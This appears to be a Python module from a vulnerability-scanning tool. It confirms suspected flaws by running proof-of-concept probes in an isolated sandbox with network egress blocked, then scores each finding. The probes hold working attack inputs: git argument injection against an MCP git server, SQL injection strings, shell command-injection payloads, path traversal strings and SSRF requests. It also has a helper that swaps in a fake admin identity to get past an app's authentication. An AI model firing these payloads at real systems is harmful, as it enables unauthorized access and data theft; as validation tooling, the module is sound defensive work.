"""Sandbox validation: run an exact exploit against a target checkout and score the result.

Exploits run in a subprocess inside a temp dir holding an allowed repo (or a copy of the web app)
and an outside canary; they only ever write inside that temp dir, and egress is pinned to a dead
local proxy so the only reachable network is the sandbox's own canary server.

Each finding is proven by the probe for its own sink function, not merely by its CWE. A probe that
cannot even be set up proves nothing, so the finding stays `suspected` and never becomes `rejected`.

Rubric (1-5). Impact: CWE-88 git option injection and CWE-78 command injection = 5; CWE-89 SQL
injection reading rows the query may not return = 5; CWE-22 operations outside the boundary and
CWE-918 SSRF into internal services = 4. Likelihood: 4 when one request or tool call with
attacker-chosen arguments suffices and no extra precondition is needed. Rejected findings score 0.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

from .types import Finding

IMPACT = {"CWE-22": 4, "CWE-88": 5, "CWE-78": 5, "CWE-89": 5, "CWE-918": 4}
LIKELIHOOD = {"CWE-22": 4, "CWE-88": 4, "CWE-78": 4, "CWE-89": 4, "CWE-918": 4}
NO_EGRESS = {"http_proxy": "http://127.0.0.1:1", "https_proxy": "http://127.0.0.1:1",
             "HTTP_PROXY": "http://127.0.0.1:1", "HTTPS_PROXY": "http://127.0.0.1:1",
             "no_proxy": "127.0.0.1,localhost", "NO_PROXY": "127.0.0.1,localhost"}

HARNESS = '''
import asyncio, contextlib, importlib, json, subprocess, sys
from pathlib import Path

server_dir, sandbox = Path(sys.argv[1]), Path(sys.argv[2]).resolve()
if not (server_dir / "mcp_server_git" / "server.py").exists():
    print(json.dumps({"reproduced": False, "setup_failed": True,
                      "output": f"no mcp_server_git/server.py under {server_dir}"}))
    raise SystemExit(0)
sys.path.insert(0, str(server_dir))
srv = importlib.import_module("mcp_server_git.server")
import mcp.server as ms

def git(cwd, *a):
    subprocess.run(["git", "-C", str(cwd), *a], check=True, capture_output=True)

def make_repo(path):
    path.mkdir(parents=True)
    git(path, "init", "-q")
    return path

async def noop(*a, **k):
    pass

@contextlib.asynccontextmanager
async def fake_stdio():
    yield None, None

def load_call_tool(repository):
    handlers = {}
    orig = ms.Server.call_tool
    def call_tool(self, *a, **k):
        reg = orig(self, *a, **k)
        def wrap(fn):
            handlers["fn"] = fn
            return reg(fn)
        return wrap
    ms.Server.call_tool, ms.Server.run, srv.stdio_server = call_tool, noop, fake_stdio
    asyncio.run(srv.serve(repository))
    return handlers["fn"]

def call(fn, name, args):
    try:
        out = asyncio.run(fn(name, args))
        return True, "".join(c.text for c in out)
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"

allowed = make_repo(sandbox / "allowed")
fn = load_call_tool(allowed)
'''

PATH_PROBE = HARNESS + '''
outside = make_repo(sandbox / "outside")
(outside / "canary_secret.txt").write_text("CANARY")
ok, out = call(fn, "git_status", {"repo_path": str(outside)})
print(json.dumps({"reproduced": ok and "canary_secret.txt" in out, "output": out[:500]}))
'''
DIFF_PROBE = HARNESS + '''
canary = sandbox / "canary_overwritten.txt"
(allowed / "a.txt").write_text("x")
git(allowed, "add", "a.txt")
ok, out = call(fn, "git_diff", {"repo_path": str(allowed), "target": f"--output={canary}"})
print(json.dumps({"reproduced": canary.exists(), "output": out[:500]}))
'''
CHECKOUT_PROBE = HARNESS + '''
canary = sandbox / "canary_secret.txt"
canary.write_text("REVA-CANARY-LEAK")
ok, out = call(fn, "git_checkout", {"repo_path": str(allowed), "branch_name": f"--pathspec-from-file={canary}"})
print(json.dumps({"reproduced": "REVA-CANARY-LEAK" in out, "output": out[:500]}))
'''

WEB_HARNESS = '''
import importlib, inspect, json, os, re, shutil, sys
from pathlib import Path
from urllib.parse import quote

target, sandbox = Path(sys.argv[1]).resolve(), Path(sys.argv[2]).resolve()
want = sys.argv[3] if len(sys.argv) > 3 else ""
app_root = sandbox / "app_under_test"
if not app_root.exists():
    shutil.copytree(target, app_root, ignore=shutil.ignore_patterns(".git", ".reva", "__pycache__", ".venv", "venv", "node_modules"))
os.chdir(app_root)
sys.path.insert(0, str(app_root))
if (app_root / "src").is_dir():
    sys.path.insert(0, str(app_root / "src"))

REQ_KEY = re.compile(r"""(?:query_params|args|form|headers|cookies|GET|POST|values|data)\\s*(?:\\[|\\.get\\w*\\(\\s*)\\s*['"]([\\w.-]+)['"]""")
AUTH_HINT = re.compile(r"user|auth|admin|token|api_?key|login|session|permission|require|current", re.I)
GATED = (401, 403, 404, 405, 422)
STATUS = []


def done(reproduced, output, setup_failed=False):
    print(json.dumps({"reproduced": bool(reproduced), "setup_failed": setup_failed, "output": str(output)[:900]}))
    raise SystemExit(0)


def _module_names():
    for p in sorted(app_root.rglob("*.py")):
        parts = list(p.relative_to(app_root).with_suffix("").parts)
        if any(x.startswith(".") or x in ("__pycache__", "tests", "test", "setup", "conftest") for x in parts):
            continue
        if parts and parts[0] == "src":
            parts = parts[1:]
        if parts and parts[-1] == "__init__":
            parts = parts[:-1]
        if parts:
            yield ".".join(parts)


def find_app():
    errs = []
    for name in _module_names():
        try:
            mod = importlib.import_module(name)
        except BaseException as exc:
            errs.append(f"{name}: {type(exc).__name__}: {exc}")
            continue
        for obj in vars(mod).values():
            if type(obj).__name__ in ("FastAPI", "Starlette") and list(_routes(obj)):
                return obj
    done(False, "no ASGI application object found in target: " + "; ".join(errs[:4]), setup_failed=True)


def _routes(obj, depth=0):
    """Every concrete route, descending into included routers (FastAPI keeps those lazy)."""
    for r in getattr(obj, "routes", None) or ():
        if getattr(r, "endpoint", None) and getattr(r, "methods", None):
            yield r
        elif depth < 4:
            yield from _routes(getattr(r, "original_router", None) or getattr(r, "router", None) or r, depth + 1)


app = find_app()
from starlette.testclient import TestClient
client = TestClient(app, raise_server_exceptions=False)
try:
    client.__enter__()                      # run the app's lifespan so it initialises its storage
except BaseException as exc:
    print(f"lifespan failed: {type(exc).__name__}: {exc}", file=sys.stderr)


def _signature(fn):
    """Annotations resolved: under `from __future__ import annotations` they are plain strings."""
    try:
        return inspect.signature(fn, eval_str=True)
    except Exception:
        return inspect.signature(fn)


def spec(route):
    """(path template, path params, query params, body fields) of one route."""
    tmpl, path_p, query_p, body_p = route.path, [], [], []
    for pname, p in _signature(route.endpoint).parameters.items():
        ann = p.annotation
        if "{" + pname + "}" in tmpl:
            path_p.append(pname)
        elif hasattr(ann, "model_fields"):
            body_p += list(ann.model_fields)
        elif getattr(ann, "__name__", "") not in ("Request", "WebSocket", "BackgroundTasks", "Response"):
            query_p.append(pname)
    try:
        query_p += [k for k in sorted(set(REQ_KEY.findall(inspect.getsource(route.endpoint)))) if k not in query_p]
    except (OSError, TypeError):
        pass
    return tmpl, path_p, query_p, body_p


def all_slots():
    """(route, kind, name) for every injectable parameter of every route."""
    out = []
    for route in _routes(app):
        tmpl, path_p, query_p, body_p = spec(route)
        out += [(route, "path", n) for n in path_p] + [(route, "query", n) for n in query_p]
        out += [(route, "body", n) for n in body_p]
    return out


def slots():
    """The injectable parameters of the finding's own route when it has one, else of every route."""
    out = all_slots()
    return [r for r in out if getattr(r[0].endpoint, "__name__", "") == want] or out


def _optional(route):
    out = set()
    for pname, p in _signature(route.endpoint).parameters.items():
        d = getattr(p.default, "default", p.default)       # FastAPI Query(default=...) wraps the default
        if p.default is not inspect.Parameter.empty and d is not ... and type(d).__name__ != "PydanticUndefinedType":
            out.add(pname)
    return out


def fire(route, slot, payload):
    tmpl, path_p, query_p, body_p = spec(route)
    url = tmpl
    for n in path_p:
        url = url.replace("{" + n + "}", quote(payload, safe="") if slot == ("path", n) else "1")
    optional = _optional(route)          # leave optional filters at their defaults: "1" can trip an allowlist first
    params = {n: (payload if slot == ("query", n) else "1") for n in query_p if slot == ("query", n) or n not in optional}
    body = {n: (payload if slot == ("body", n) else "1") for n in body_p}
    method = sorted(set(route.methods) - {"HEAD", "OPTIONS"})[0]
    r = client.request(method, url, params=params, json=body or None)
    STATUS.append(r.status_code)
    return r


def warm_up():
    """One benign request per slot of the whole app, so it creates its database and data dirs first."""
    for route, kind, name in all_slots():
        try:
            fire(route, (kind, name), "1")
        except Exception:
            pass
    STATUS.clear()


class Principal:
    """Stand-in for whatever an authentication dependency hands the handler."""

    def __init__(self):
        self.id = self.team = self.team_id = self.username = self.name = self.email = "reva"
        self.is_admin = self.is_superuser = self.is_active = self.active = True
        self.role, self.roles, self.scopes = "admin", ["admin"], ["admin"]

    def __getattr__(self, key):
        return "reva"

    def __getitem__(self, key):
        return "reva"


def _authenticate():
    """Satisfy the app's own authentication dependencies, leaving every other dependency real."""
    names = []
    for route in _routes(app):
        stack = list(getattr(getattr(route, "dependant", None), "dependencies", None) or ())
        while stack:
            dep = stack.pop()
            call = getattr(dep, "call", None)
            stack += list(getattr(dep, "dependencies", None) or ())
            if callable(call) and AUTH_HINT.search(getattr(call, "__name__", "")):
                app.dependency_overrides[call] = lambda: Principal()
                names.append(call.__name__)
    return sorted(set(names))


def prove(attempt, failure):
    """Try as an anonymous caller, then as an authenticated one, and disclose which proved it."""
    hit = attempt()
    if hit:
        done(True, hit)
    if STATUS and not [s for s in STATUS if s not in GATED]:
        who = _authenticate()
        if who:
            STATUS.clear()
            hit = attempt()
            if hit:
                done(True, f"{hit} -- reached with the app's own authentication dependencies satisfied "
                           f"({', '.join(who)}), so any authenticated caller can do this")
    if STATUS and not [s for s in STATUS if s not in GATED]:
        done(False, f"{failure}; no request reached the handler (statuses {sorted(set(STATUS))}), so the route "
                    f"is gated by auth or request validation and the probe could not exercise it", setup_failed=True)
    if not STATUS:
        done(False, f"{failure}; the probe found no injectable parameter to exercise", setup_failed=True)
    done(False, failure)
'''

SQL_PROBE = WEB_HARNESS + '''
import sqlite3

MARK = "REVA-CANARY-SQL-7f3a"
# the last two need no comment, so they also work when bound placeholders follow the injection point
PAYLOADS = ["' OR '1'='1' -- ", "x' OR '1'='1' -- ", '" OR "1"="1" -- ', "' OR 1=1 -- ", "1 OR 1=1",
            "' OR 1=1 OR ''='", '" OR 1=1 OR ""="']

warm_up()
dbs = sorted({p for pat in ("*.db", "*.sqlite", "*.sqlite3") for p in sandbox.rglob(pat)})
if not dbs:
    done(False, "no sqlite database was created inside the sandbox", setup_failed=True)

seeded = []
for db in dbs:
    con = sqlite3.connect(db)
    for (tbl,) in con.execute("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'").fetchall():
        cols = con.execute('PRAGMA table_info("%s")' % tbl).fetchall()
        vals = [999001 if "INT" in (c[2] or "").upper() else MARK for c in cols]
        try:
            con.execute('INSERT INTO "%s" VALUES (%s)' % (tbl, ",".join("?" * len(cols))), vals)
            seeded.append(f"{db.name}:{tbl}")
        except sqlite3.Error:
            pass
    con.commit()
    con.close()
if not seeded:
    done(False, f"no table in {[d.name for d in dbs]} could be seeded with a canary row", setup_failed=True)


def attempt():
    for route, kind, name in slots():
        slot = (kind, name)
        try:
            control = fire(route, slot, "reva-no-such-value")
        except Exception:
            continue
        if MARK in control.text:
            continue                              # this endpoint hands the row out anyway: nothing to prove
        for payload in PAYLOADS:
            try:
                r = fire(route, slot, payload)
            except Exception:
                continue
            if MARK in r.text:
                return (f"{route.path} [{kind}:{name}] with {payload!r} returned the canary row {MARK}, which "
                        f"the control request (status {control.status_code}, {len(control.text)} bytes) did not "
                        f"return; canary seeded into {', '.join(seeded[:4])}")
    return None


prove(attempt, f"no injection returned the canary row (seeded {', '.join(seeded[:4])})")
'''

SSRF_PROBE = WEB_HARNESS + '''
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

MARK = "REVA-CANARY-SSRF-5c21"
hits = []


class Canary(BaseHTTPRequestHandler):
    def do_GET(self):
        hits.append(f"{self.command} {self.path}")
        body = MARK.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_POST = do_PUT = do_HEAD = do_GET

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", 0), Canary)
threading.Thread(target=srv.serve_forever, daemon=True).start()
canary_url = f"http://127.0.0.1:{srv.server_address[1]}/reva-canary"
warm_up()


def attempt():
    for route, kind, name in slots():
        before = len(hits)
        try:
            r = fire(route, (kind, name), canary_url)
        except Exception:
            continue
        if len(hits) > before:
            return (f"{route.path} [{kind}:{name}] fetched the sandbox canary server at {canary_url} "
                    f"({'; '.join(hits[before:])}); response {r.status_code}, canary body echoed back: "
                    f"{MARK in r.text}. A real deployment would reach internal services the same way.")
    return None


prove(attempt, f"no route fetched the local canary server at {canary_url}")
'''

CMD_PROBE = WEB_HARNESS + '''
warm_up()
canary = sandbox / "canary_cmd.txt"
PAYLOADS = [f"x; touch {canary}", f"x$(touch {canary})", f"x`touch {canary}`",
            f"x | touch {canary}", f"x && touch {canary}", f"x\\ntouch {canary}\\n"]


def attempt():
    for route, kind, name in slots():
        for payload in PAYLOADS:
            try:
                r = fire(route, (kind, name), payload)
            except Exception:
                continue
            if canary.exists():
                return (f"{route.path} [{kind}:{name}] with {payload!r} ran an injected shell command that "
                        f"created {canary}, outside the application directory; response {r.status_code}")
    return None


prove(attempt, f"no route created the canary file {canary}")
'''

WEB_PATH_PROBE = WEB_HARNESS + '''
warm_up()
MARK = "REVA-CANARY-LEAK"
canary = sandbox / "canary_secret.txt"
canary.write_text(MARK)
PAYLOADS = ["../" * n + canary.name for n in range(1, 9)] + [str(canary), "/etc/hostname"]


def attempt():
    for route, kind, name in slots():
        for payload in PAYLOADS:
            try:
                r = fire(route, (kind, name), payload)
            except Exception:
                continue
            if MARK in r.text:
                return (f"{route.path} [{kind}:{name}] with {payload!r} returned the contents of {canary}, "
                        f"which lies outside the served document directory; response {r.status_code}")
    return None


prove(attempt, f"no route returned the contents of {canary}")
'''

# (cwe, sink function) -> probe. FALLBACK holds the probes tried, in order, when no sink-specific
# one exists: the first one that can actually be set up against this target decides the verdict.
PROBES = {
    ("CWE-88", "git_diff"): DIFF_PROBE,
    ("CWE-88", "git_checkout"): CHECKOUT_PROBE,
}
FALLBACK = {
    "CWE-22": [PATH_PROBE, WEB_PATH_PROBE],
    "CWE-78": [CMD_PROBE],
    "CWE-89": [SQL_PROBE],
    "CWE-918": [SSRF_PROBE],
}


def probes_for(cwe: str, function: str) -> list[str]:
    """Every probe that could prove this finding: the function-specific one, else the CWE chain."""
    hit = PROBES.get((cwe, function))
    return [hit] if hit else list(FALLBACK.get(cwe, ()))


def probe_for(cwe: str, function: str) -> str | None:
    """The probe that proves *this* finding: the function-specific one if there is one, else the CWE fallback."""
    probes = probes_for(cwe, function)
    return probes[0] if probes else None


def find_server_dir(target_dir: Path) -> Path | None:
    hits = sorted(Path(target_dir).resolve().rglob("mcp_server_git/server.py"))
    return hits[0].parent.parent if hits else None


def run_exploit(probe: str, target_dir: Path, timeout: int = 90, function: str = "") -> tuple[bool, str, bool]:
    """Run `probe` against target_dir in a throwaway sandbox; returns (reproduced, output, ran).

    `ran` is False when the probe could not be set up at all, which demonstrates nothing either way.
    """
    root = find_server_dir(target_dir) or Path(target_dir).resolve()
    with tempfile.TemporaryDirectory(prefix="reva-sandbox-") as sandbox:
        script = Path(sandbox) / "exploit.py"
        script.write_text(probe)
        work = Path(sandbox) / "work"
        work.mkdir()
        try:
            proc = subprocess.run([sys.executable, str(script), str(root), str(work), function],
                                  capture_output=True, text=True, timeout=timeout, cwd=work,
                                  env={**os.environ, **NO_EGRESS})
        except subprocess.TimeoutExpired:
            return False, "exploit timed out", True
    lines = proc.stdout.strip().splitlines()
    try:
        result = json.loads(lines[-1])
    except (IndexError, json.JSONDecodeError):
        return False, f"exploit crashed: {(proc.stderr or proc.stdout)[-500:]}", False
    return bool(result["reproduced"]), result["output"], not result.get("setup_failed")


def validate(finding: Finding, target_dir: str | Path) -> Finding:
    unproven = []
    for probe in probes_for(finding.cwe, finding.function):
        reproduced, output, ran = run_exploit(probe, Path(target_dir), function=finding.function)
        if not ran:
            unproven.append(output)
            continue
        update = {"exploit": probe, "evidence": output}
        if reproduced:
            update |= {"status": "confirmed", "impact": IMPACT.get(finding.cwe, 3),
                       "likelihood": LIKELIHOOD.get(finding.cwe, 3)}
        else:
            update |= {"status": "rejected", "impact": 0, "likelihood": 0}
        return finding.model_copy(update=update)
    detail = "; ".join(unproven) or f"no exploit probe for {finding.cwe} in {finding.function}"
    return finding.model_copy(update={"status": "suspected", "impact": 0, "likelihood": 0,
                                      "evidence": f"unproven: {detail}, so nothing was demonstrated"})
